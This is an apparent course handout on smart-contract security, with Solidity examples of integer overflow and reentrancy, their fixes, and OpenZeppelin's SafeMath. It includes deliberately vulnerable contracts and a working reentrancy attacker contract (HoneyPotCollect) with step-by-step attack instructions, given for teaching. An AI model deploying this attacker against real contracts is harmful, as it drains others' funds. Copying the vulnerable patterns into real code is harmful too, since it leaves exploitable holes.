# Blockchain-Security-and-Auditing


Security & Auditing - Blockchain
Profa Solange Gueiros

solangegueiros@gmail.com
https://solange.dev 
https://medium.com/@solangegueiros
https://www.linkedin.com/in/solangegueiros/
twitter, facebook, instagram: solangegueiros

https://pad.riseup.net/p/fiapblock-2020-01

https://swcregistry.io/


https://remix.ethereum.org/

Environment Solidity


1- Integer Overflow and Underflow
https://swcregistry.io/docs/SWC-101

IntegerOverflow.sol

pragma solidity ^0.5.11;

contract IntegerOverflow {

  uint256 constant MAX_UINT256 = 2**256-1;

  mapping (address => uint256) public balanceOf;

  constructor() public {
    balanceOf[msg.sender] = MAX_UINT256;
  }

  function transfer(address _to, uint256 _value) public {
 balanceOf[msg.sender] -= _value;
      balanceOf[_to] += _value;
  }
}




SOLIDITY COMPILER
auto-compile
Compile

DEPLOY & RUN TRANSACTIONS


função Transfer verificando saldo

if (balanceOf[msg.sender] >= _value) {

  function transfer(address _to, uint256 _value) public {
      if (balanceOf[msg.sender] >= _value) {
 balanceOf[msg.sender] -= _value;
      balanceOf[_to] += _value;
}
  }


require(balanceOf[msg.sender] >= _value && balanceOf[_to] + _value >= balanceOf[_to]);

  function transfer(address _to, uint256 _value) public {
      require(balanceOf[msg.sender] >= _value, "Saldo insuficiente");
 balanceOf[msg.sender] -= _value;
      balanceOf[_to] += _value;
  }

Resolvendo somente o overflow
  function transfer(address _to, uint256 _value) public {
      require(balanceOf[_to] + _value >= balanceOf[_to], "balance overflow");
 balanceOf[msg.sender] -= _value;
      balanceOf[_to] += _value;
  }


The DAO
A DAO is a Decentralized Autonomous Organization. 
Its goal is to codify the rules and decisionmaking apparatus of an organization, eliminating the need for documents and people in governing, creating a structure with decentralized control.

The DAO was hacked
June 17th 2016
3.6 million Ether ($50 Million) were stolen using the first reentrancy attack.

Ethereum Foundation issued a critical update to rollback the hack. 
This resulted in Ethereum being forked into Ethereum Classic and Ethereum.


Reentrancy on a Single Function
Função que pode ser chamada várias vezes antes que a primeira chamada termine.


HoneyPot.sol

pragma solidity ^0.5.11;

contract HoneyPot {
  mapping (address => uint) public balances;
  
  constructor() public payable {
    put();
  }
  
  function put() public payable {
    balances[msg.sender] = msg.value;
  }
  
  function get() public {
      uint amountToWithdraw = balances[msg.sender];
      (bool success, ) = msg.sender.call.value(amountToWithdraw)("");
      require(success);
      balances[msg.sender] = 0;
  }
  
  function totalSupply() public view returns (uint256) {
      return address(this).balance;
  }  
  
  function() external {
    revert();
  }
  
}



contract HoneyPotCollect {
  HoneyPot public honeypot;
  
  constructor(address _honeypot) public payable {
    honeypot = HoneyPot(_honeypot);
  }
  
  function kill () public {
    selfdestruct(msg.sender);
  }
  
  function collect() public payable {
    honeypot.put.value(msg.value)();
    honeypot.get();
  }
  
  function () external payable {
    if (address(honeypot).balance >= msg.value) {
      honeypot.get();
    }
  }
  
  function totalSupply() public view returns (uint256) {
      return address(this).balance;
  }  
  
}


Somente o owner pode fazer o kill

contract HoneyPotCollect {
  HoneyPot public honeypot;
  address payable owner;
  
  constructor(address _honeypot) public payable {
    honeypot = HoneyPot(_honeypot);
    owner = msg.sender;
  }
  
  function kill () public {
    require (msg.sender == owner, "only owner");
    selfdestruct(msg.sender);
  }
  
  function collect() public payable {
    honeypot.put.value(msg.value)();
    honeypot.get();
  }
  
  function () external payable {
    if (address(honeypot).balance >= msg.value) {
      honeypot.get();
    }
  }
  
  function totalSupply() public view returns (uint256) {
      return address(this).balance;
  }  
  
}


The Attack
Deploy HoneyPot a partir da conta 1 enviando 70 Ethers
Balance, TotalSupply
Put da conta 2 enviando  80 Ethers
Balance, TotalSupply

Deploy HoneyPotCollect a partir da da conta 3 (não precisa enviar nada)
Collect a partir da da conta 3 enviando 10 Ethers
HoneyPot: Balances, TotalSupply
HoneyPotCollect TotalSupply
Kill

https://securify.chainsecurity.com/report/9af0094292f0172d3d8b02a4163f68b26604fc334c86b7743bf4270039a99af8

HoneyPot Sem problemas:
pragma solidity ^0.5.11;

contract HoneyPot {
  mapping (address => uint) public balances;
  
  constructor() public payable {
    put();
  }
  
  function put() public payable {
    balances[msg.sender] = msg.value;
  }
  
  function get() public {
      uint amountToWithdraw = balances[msg.sender];
      balances[msg.sender] = 0;
      (bool success, ) = msg.sender.call.value(amountToWithdraw)("");
      require(success);
      
  }
  
  function totalSupply() public view returns (uint256) {
      return address(this).balance;
  }  
  
  function() external {
    revert();
  }
  
}


contract HoneyPotCollect {
  HoneyPot public honeypot;
  address payable owner;
  
  constructor(address _honeypot) public payable {
    honeypot = HoneyPot(_honeypot);
    owner = msg.sender;
  }
  
  function kill () public {
    require (msg.sender == owner, "only owner");
    selfdestruct(msg.sender);
  }
  
  function collect() public payable {
    honeypot.put.value(msg.value)();
    honeypot.get();
  }
  
  function () external payable {
    if (address(honeypot).balance >= msg.value) {
      honeypot.get();
    }
  }
  
  function totalSupply() public view returns (uint256) {
      return address(this).balance;
  }  
  
}


Balance problem
O que acontece se alguém mandar Ether 2x para o HoneyPot?



https://github.com/OpenZeppelin/openzeppelin-contracts

https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol



IntegerOK.sol


pragma solidity ^0.5.11;

contract IntegerOk {
    using SafeMath for uint256;

  uint256 constant MAX_UINT256 = 2**256-1;

  mapping (address => uint256) public balanceOf;

  constructor() public {
    balanceOf[msg.sender] = MAX_UINT256;
  }

  function transfer(address _to, uint256 _value) public {
    balanceOf[msg.sender] = balanceOf[msg.sender].sub(_value);
    balanceOf[_to] = balanceOf[_to].add(_value);
  }

}


/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     *
     * _Available since v2.4.0._
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     *
     * _Available since v2.4.0._
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     *
     * _Available since v2.4.0._
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

https://securify.chainsecurity.com/report/eea3a02a0808097c309be39f148971438027c4199f17b74b0d30edb94f7d4df6


https://medium.com/coinmonks/dissecting-an-ethereum-honey-pot-7102d7def5e0
https://hackernoon.com/the-sneakiest-ethereum-scam-ever-6dc138061235

https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4
https://github.com/gustavoguimaraes/honeyPotReentranceAttack


msg.sender.call() calls the fallback-function on msg.sender
